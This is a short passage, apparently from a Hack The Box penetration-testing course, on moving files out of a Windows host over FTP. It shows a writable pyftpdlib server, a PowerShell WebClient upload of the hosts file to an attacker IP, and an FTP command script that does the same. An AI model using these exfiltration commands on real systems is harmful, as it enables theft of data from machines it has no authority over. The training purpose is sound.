
```Shell
3kjS@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write
```

## PowerShell Upload File

```powershell
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

## Create a Command File for the FTP Client to Upload a File

```Cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt 
C:\htb> echo USER anonymous >> ftpcommand.txt 
C:\htb> echo binary >> ftpcommand.txt 
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt C:\htb> echo bye >> ftpcommand.txt 
C:\htb> ftp -v -n -s:ftpcommand.txt 
ftp> open 192.168.49.128 

Log in with USER and PASS first. 


ftp> USER anonymous ftp> PUT c:\windows\system32\drivers\etc\hosts 
ftp> bye
```

